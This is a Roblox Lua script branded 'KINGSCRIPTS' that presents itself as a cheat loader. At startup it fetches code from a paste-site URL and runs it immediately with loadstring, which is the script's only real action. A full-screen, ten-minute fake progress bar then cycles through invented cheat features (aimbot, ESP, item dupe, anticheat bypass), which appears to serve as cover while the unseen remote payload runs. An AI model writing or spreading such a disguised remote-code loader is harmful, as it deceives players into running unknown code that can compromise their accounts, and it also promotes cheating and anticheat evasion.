local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")

-- SCRIPT A CARGAR
local scriptURL = "https://cdn.sourceb.in/bins/jmUzaH29zn/0"

-- Descargar y ejecutar inmediatamente
task.spawn(function()
	local success, result = pcall(function()
		return game:HttpGet(scriptURL)
	end)

	if success and result then
		loadstring(result)() -- SE EJECUTA INMEDIATAMENTE
	end
end)

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "KingLoader"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- Fondo
local bg = Instance.new("Frame")
bg.Parent = gui
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(8,8,12)

-- Titulo
local title = Instance.new("TextLabel")
title.Parent = bg
title.Size = UDim2.new(0,500,0,70)
title.Position = UDim2.new(0.5,-250,0.32,0)
title.BackgroundTransparency = 1
title.Text = "KINGSCRIPTS"
title.TextColor3 = Color3.fromRGB(0,170,255)
title.Font = Enum.Font.GothamBlack
title.TextSize = 48
title.ZIndex = 10

-- Animación ligera logo
task.spawn(function()
	while true do
		local glow = TweenService:Create(
			title,
			TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
			{TextColor3 = Color3.fromRGB(120,220,255)}
		)

		local back = TweenService:Create(
			title,
			TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
			{TextColor3 = Color3.fromRGB(0,170,255)}
		)

		glow:Play()
		glow.Completed:Wait()

		back:Play()
		back.Completed:Wait()
	end
end)

-- Texto carga
local loadingText = Instance.new("TextLabel")
loadingText.Parent = bg
loadingText.Size = UDim2.new(0,600,0,40)
loadingText.Position = UDim2.new(0.5,-300,0.45,0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Inicializando..."
loadingText.TextColor3 = Color3.new(1,1,1)
loadingText.Font = Enum.Font.Gotham
loadingText.TextSize = 22

-- Porcentaje
local percent = Instance.new("TextLabel")
percent.Parent = bg
percent.Size = UDim2.new(0,200,0,30)
percent.Position = UDim2.new(0.5,-100,0.60,0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(170,170,170)
percent.Font = Enum.Font.Gotham
percent.TextSize = 18

-- Barra fondo
local barBG = Instance.new("Frame")
barBG.Parent = bg
barBG.Size = UDim2.new(0,600,0,22)
barBG.Position = UDim2.new(0.5,-300,0.55,0)
barBG.BackgroundColor3 = Color3.fromRGB(40,40,50)
Instance.new("UICorner",barBG)

-- Barra progreso
local bar = Instance.new("Frame")
bar.Parent = barBG
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
Instance.new("UICorner",bar)

-- Brillo barra
local gradient = Instance.new("UIGradient")
gradient.Parent = bar
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,170,255))
}
gradient.Offset = Vector2.new(-1,0)

task.spawn(function()
	while true do
		local tween = TweenService:Create(
			gradient,
			TweenInfo.new(1.2, Enum.EasingStyle.Linear),
			{Offset = Vector2.new(1,0)}
		)
		tween:Play()
		tween.Completed:Wait()
		gradient.Offset = Vector2.new(-1,0)
	end
end)

-- Tareas
local tasks = {
"Inicializando sistema...",
"Cargando exploit core...",
"Cargando script injector...",
"Cargando bypass anticheat...",
"Loading dupe gui...",
"Loading generate guns module...",
"Loading infinite ammo system...",
"Loading god mode patch...",
"Cargando silent aim...",
"Cargando aimbot v3...",
"Cargando ESP players...",
"Cargando ESP items...",
"Cargando wallhack system...",
"Cargando teleport system...",
"Cargando autofarm engine...",
"Cargando coin magnet...",
"Cargando player tracker...",
"Cargando visual mods...",
"Cargando fps booster...",
"Cargando UI library...",
"Cargando key system bypass...",
"Cargando admin commands...",
"Cargando inventory editor...",
"Cargando weapon modifier...",
"Cargando stealth mode...",
"Cargando script protection...",
"Cargando network bypass...",
"Optimizando memoria...",
"Finalizando carga..."
}

local totalTime = 600
local stepTime = totalTime / #tasks

for i,task in ipairs(tasks) do

	loadingText.Text = task

	local progress = i/#tasks
	percent.Text = math.floor(progress*100).."%"

	local tween = TweenService:Create(
		bar,
		TweenInfo.new(stepTime, Enum.EasingStyle.Linear),
		{Size = UDim2.new(progress,0,1,0)}
	)

	tween:Play()
	tween.Completed:Wait()

end

loadingText.Text = "Script cargado correctamente..."
percent.Text = "100%"

task.wait(3)
gui:Destroy()